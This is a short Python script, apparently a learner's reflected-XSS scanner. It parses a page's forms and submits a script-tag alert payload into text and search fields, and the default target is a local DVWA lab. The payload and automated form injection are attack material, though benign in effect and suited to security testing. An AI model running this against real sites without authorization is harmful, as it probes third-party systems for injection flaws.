#Auther: mahmoud3x0
#Reflected XSS Scanner
#futured work: DOM Based & Stored XSS
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

reflected = []
stored = []
dom = []

def get_all_forms(url):
    response = requests.get(url).content
    soup = BeautifulSoup(response, "html.parser")
    return soup.find_all("form")

def get_form_info(form):

    action = form.attrs.get("action", "").lower()
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        name_attr = input_tag.attrs.get("name", "")
        id_attr = input_tag.attrs.get("id", "")
        type_attr = input_tag.attrs.get("type", "text")
        inputs.append({"name": name_attr, "id": id_attr, "type": type_attr})

    form_info = {}
    form_info["method"] = method
    form_info["action"] = action
    form_info["inputs"] = inputs
    return form_info

def submit_form(form_info, original_url, payload):
    endpoint = form_info["action"]
    target_url = urljoin(original_url, endpoint)

    data = {}
    for input_field in form_info["inputs"]:
        if input_field["type"] == "text" or input_field["type"] == "search": #test on text & search forms
            input_field["value"] = payload

        input_name = input_field.get("name")
        input_value = input_field.get("value")
        if input_name and input_value:
            data[input_name] = input_value


    #submit the malicious payload
    if form_info["method"] == "post":
        return requests.post(target_url, data=data)
    else:
        return requests.get(target_url, params=data)

#detect all vulnerable forms of this url
def reflected_xss(url, payload):
    forms = get_all_forms(url)
    vulnerable = False
    for form in forms:
        form_info = get_form_info(form)
        content = submit_form(form_info, url, payload).content.decode()

        if "mahmoud3x0" in content:
            vulnerable = True
            reflected.append({"payload": payload, "url": url, "form_info": form_info})

    return vulnerable

def stored_xss(url, payload):
    pass

def dom_xss(url, payload):
    pass

def scan(url, payload):

    payload = "<scriPt>alert('mahmoud3x0')</scriPT>"
    ####################################################################################################################################
    # Payloads = open('generalPayloads.txt', 'r')                                                                                      #
    # if technology.lower() == "nodejs":                                                                                               #
    #     Payloads = open('nodejsPayloads.txt', 'r')                                                                                   #
    # elif technology.lower() == "jquery"                                                                                              #
    #     Payloads = open('jqueryPayloads.txt', 'r')                                                                                   #
    # elsif..                                                                                                                          #
    # for payload in Payloads:                                                                                                         #
    #    pass                                                                                                                          #
    ####################################################################################################################################

    if reflected_xss(url, payload):
        for xss in reflected:
            print("Detected Reflected XSS: ")
            print(f"url: {xss["url"]}\nPayload: {xss["payload"]}")

    ####################################################################################################################################
    # if stored_xss(url, technology):
    #     for xss in stored:
    #         print("Detected Stored XSS: ")
    #         print(f"url: {xss["url"]}\nPayload: {xss["payload"]}")
    # if dom_xss(url, technology):
    #     for xss in dom:
    #         print("Detected DOM Based XSS: ")
    #         print(f"url: {xss["url"]}\nPayload: {xss["payload"]}")
    ####################################################################################################################################

if __name__ == "__main__":

    #####################################################################################################################################
    # url = input("Enter target URL: ")                                                                                                 #
    # technology = input("Choose the target technology: general, nodejs, jquery, ..")                                                   #
    #####################################################################################################################################

    url = "http://127.0.0.1/dvwa/vulnerabilities/xss_r/"
    technology = "general"
    scan(url, technology)

#https://xss-game.appspot.com/level1/frame

